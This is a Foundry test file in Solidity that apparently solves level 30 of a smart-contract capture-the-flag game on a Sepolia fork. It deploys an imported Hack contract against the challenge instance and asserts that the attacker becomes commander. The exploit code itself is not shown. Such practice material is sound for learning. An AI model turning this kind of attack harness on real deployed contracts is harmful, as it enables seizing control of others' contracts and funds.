//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Hack, IHigherOrder} from "../src/level30.sol";

contract level30Test is Test {
    IHigherOrder target;

    function setUp() public {
        vm.createSelectFork("SEPOLIA");
        address instanceAddress = vm.envAddress("INSTANCE_AD");
        target = IHigherOrder(instanceAddress);
    }

    function testSolvesLeve30() public {
        address hacker = makeAddr("hacker");

        address commanderBefore = target.commander();
        uint256 treasuryBefore = target.treasury();
        console.log("Commander before:", commanderBefore);
        console.log("Treasury before:", treasuryBefore);

        vm.startPrank(hacker, hacker);
        Hack attackContract = new Hack();
        attackContract.hack(address(target));
        target.claimLeadership();
        vm.stopPrank();

        address commanderAfter = target.commander();
        uint256 treasuryAfter = target.treasury();
        console.log("Commander after:", commanderAfter);
        console.log("Treasury after:", treasuryAfter);

        assertEq(commanderAfter, hacker, "Commander should be hacker");
        assertTrue(treasuryAfter > 255, "Treasury should be greater than 255");
    }
}
//INSTANCE_AD=0x786b68afDbd217308189b967D098cAd137d98691. forge test --mt testSolvesLeve30 -vvv
